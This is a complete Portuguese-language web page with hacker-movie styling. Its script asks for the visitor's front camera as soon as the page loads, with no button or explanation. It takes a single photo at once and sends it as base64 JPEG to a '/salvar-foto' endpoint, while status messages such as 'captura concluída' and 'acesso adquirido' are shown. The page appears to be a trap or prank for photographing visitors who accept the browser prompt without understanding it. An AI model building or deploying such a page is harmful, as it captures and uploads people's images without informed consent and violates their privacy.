<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acesso Concedido</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Courier New', monospace;
            background: #0a0e27;
            color: #00ff00;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            overflow: hidden;
            position: relative;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: repeating-linear-gradient(
                0deg,
                rgba(0, 255, 0, 0.03) 0px,
                rgba(0, 255, 0, 0.03) 1px,
                transparent 1px,
                transparent 2px
            );
            pointer-events: none;
            z-index: 1;
            animation: flicker 0.15s infinite;
        }

        @keyframes flicker {
            0% { opacity: 0.97; }
            50% { opacity: 1; }
            100% { opacity: 0.97; }
        }

        .container {
            background: rgba(10, 14, 39, 0.9);
            border: 2px solid #00ff00;
            border-radius: 5px;
            padding: 30px;
            max-width: 600px;
            width: 100%;
            text-align: center;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
            z-index: 2;
            position: relative;
            backdrop-filter: blur(10px);
        }

        h1 {
            color: #00ff00;
            margin-bottom: 10px;
            font-size: 28px;
            text-shadow: 0 0 10px #00ff00;
            letter-spacing: 2px;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; text-shadow: 0 0 10px #00ff00; }
            50% { opacity: 0.7; text-shadow: 0 0 20px #00ff00; }
        }

        p {
            color: #00cc00;
            margin-bottom: 30px;
            font-size: 14px;
            text-shadow: 0 0 5px #00ff00;
        }

        .video-container {
            position: relative;
            width: 100%;
            margin-bottom: 20px;
            border-radius: 5px;
            overflow: hidden;
            background: #000;
            display: none;
            border: 2px solid #00ff00;
            box-shadow: inset 0 0 20px rgba(0, 255, 0, 0.3);
        }

        video {
            width: 100%;
            height: auto;
            display: block;
            filter: hue-rotate(90deg) contrast(1.2);
        }

        canvas {
            display: none;
        }

        .button-group {
            display: flex;
            gap: 10px;
            justify-content: center;
            flex-wrap: wrap;
        }

        button {
            background: transparent;
            color: #00ff00;
            border: 2px solid #00ff00;
            padding: 12px 25px;
            font-size: 14px;
            border-radius: 3px;
            cursor: pointer;
            font-weight: bold;
            font-family: 'Courier New', monospace;
            transition: all 0.3s;
            text-shadow: 0 0 5px #00ff00;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
        }

        button:hover {
            background: #00ff00;
            color: #0a0e27;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.8);
            transform: scale(1.05);
        }

        button:active {
            transform: scale(0.95);
        }

        button:disabled {
            background: #333;
            color: #666;
            cursor: not-allowed;
            border-color: #666;
            box-shadow: none;
            transform: none;
        }

        .status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 3px;
            display: none;
            font-weight: bold;
            border: 2px solid;
            text-shadow: 0 0 5px currentColor;
        }

        .status.success {
            background: rgba(0, 255, 0, 0.1);
            color: #00ff00;
            border-color: #00ff00;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
            animation: glitch 0.3s;
        }

        .status.error {
            background: rgba(255, 0, 0, 0.1);
            color: #ff0000;
            border-color: #ff0000;
            box-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
        }

        .status.info {
            background: rgba(0, 150, 255, 0.1);
            color: #00bfff;
            border-color: #00bfff;
            box-shadow: 0 0 10px rgba(0, 150, 255, 0.5);
        }

        #preview {
            width: 100%;
            border-radius: 3px;
            margin-top: 20px;
            display: none;
            border: 2px solid #00ff00;
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.6);
        }

        .countdown {
            font-size: 72px;
            font-weight: bold;
            color: #ff0000;
            margin: 20px 0;
            display: none;
            text-shadow: 0 0 20px #ff0000;
            animation: countdownGlow 0.5s infinite;
        }

        @keyframes countdownGlow {
            0% { text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000; }
            100% { text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000, 0 0 60px #ff0000; }
        }

        @keyframes glitch {
            0%, 100% { transform: translate(0); }
            20% { transform: translate(-2px, 2px); }
            40% { transform: translate(-2px, -2px); }
            60% { transform: translate(2px, 2px); }
            80% { transform: translate(2px, -2px); }
        }

        .hacker-effect {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 255, 0, 0.1);
            display: none;
            z-index: 999;
            pointer-events: none;
            animation: hackerFlash 0.2s;
        }

        @keyframes hackerFlash {
            0%, 100% { background: rgba(0, 255, 0, 0.1); }
            50% { background: rgba(0, 255, 0, 0.3); }
        }

        .matrix-text {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: none;
            z-index: 998;
            pointer-events: none;
            font-size: 20px;
            color: rgba(0, 255, 0, 0.1);
            overflow: hidden;
            line-height: 1.2;
        }

        @keyframes slideDown {
            0% { transform: translateY(-100%); }
            100% { transform: translateY(100vh); }
        }

        .matrix-line {
            animation: slideDown 3s linear infinite;
            white-space: nowrap;
        }
    </style>
</head>
<body>
    <div class="hacker-effect" id="hackerEffect"></div>
    <div class="matrix-text" id="matrixText"></div>

    <div class="container">
        <h1>⚠️ ACESSO CONCEDIDO ⚠️</h1>
        <p>SISTEMA DE CAPTURA ATIVADO</p>

        <div class="video-container">
            <video id="video" playsinline></video>
        </div>

        <div class="countdown" id="countdown"></div>

        <img id="preview" alt="Captura">

        <div class="button-group">
        </div>

        <div class="status" id="status"></div>
    </div>

    <canvas id="canvas"></canvas>

    <script>
        let stream = null;
        let fotoCapturada = null;

        function mostrarStatus(mensagem, tipo = 'info') {
            const statusEl = document.getElementById('status');
            statusEl.textContent = mensagem;
            statusEl.className = `status ${tipo}`;
            statusEl.style.display = 'block';
        }

        function efeituHacker() {
            const effect = document.getElementById('hackerEffect');
            effect.style.display = 'block';
            setTimeout(() => {
                effect.style.display = 'none';
            }, 200);
        }

        function gerarMatrixEffect() {
            const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン█▓▒░';
            let text = '';
            
            for (let i = 0; i < 50; i++) {
                const char = chars.charAt(Math.floor(Math.random() * chars.length));
                text += char;
            }
            
            return text;
        }

        function iniciarCamera() {
            mostrarStatus('INICIANDO ACESSO À CÂMERA...', 'info');
            efeituHacker();

            navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: 'user',
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                }
            })
            .then(function(mediaStream) {
                stream = mediaStream;
                const video = document.getElementById('video');
                video.srcObject = stream;

                video.onloadedmetadata = function() {
                    video.play();
                    iniciarContagem();
                };

                document.getElementById('video').parentElement.style.display = 'block';

                mostrarStatus('[✓] CÂMERA ATIVADA - PREPARANDO CAPTURA...', 'success');
            })
            .catch(function(erro) {
                console.error('Erro ao acessar a câmera:', erro);
                let mensagem = '[x] ERRO: ';
                
                if (erro.name === 'NotAllowedError') {
                    mensagem += 'Permissão negada. Acesso não autorizado.';
                } else if (erro.name === 'NotFoundError') {
                    mensagem += 'Câmera não detectada no sistema.';
                } else {
                    mensagem += erro.message;
                }

                mostrarStatus(mensagem, 'error');
            });
        }

        function iniciarContagem() {
            tirarFoto();
        }

        function tirarFoto() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            ctx.drawImage(video, 0, 0);

            fotoCapturada = canvas.toDataURL('image/jpeg', 0.95);

            efeituHacker();
            document.getElementById('preview').src = fotoCapturada;
            document.getElementById('preview').style.display = 'block';

            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }

            document.getElementById('video').parentElement.style.display = 'none';

            mostrarStatus('[✓] CAPTURA CONCLUÍDA - ENVIANDO PARA SERVIDOR...', 'success');
            
            setTimeout(() => {
                baixarFotoAutomatico();
            }, 800);
        }

        function baixarFotoAutomatico() {
            if (!fotoCapturada) return;

            mostrarStatus('[⟳] TRANSMITINDO DADOS...', 'info');

            fetch('/salvar-foto', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ foto: fotoCapturada })
            })
            .then(response => response.json())
            .then(data => {
                efeituHacker();
                if (data.sucesso) {
                    mostrarStatus(`[✓✓✓] ACESSO ADQUIRIDO: ${data.arquivo}`, 'success');
                } else {
                    mostrarStatus('[x] ' + data.mensagem, 'error');
                }
            })
            .catch(erro => {
                console.error('Erro:', erro);
                mostrarStatus('[x] ERRO NA TRANSMISSÃO DE DADOS', 'error');
            });
        }

        window.addEventListener('load', function() {
            iniciarCamera();
        });
    </script>
</body>
</html>
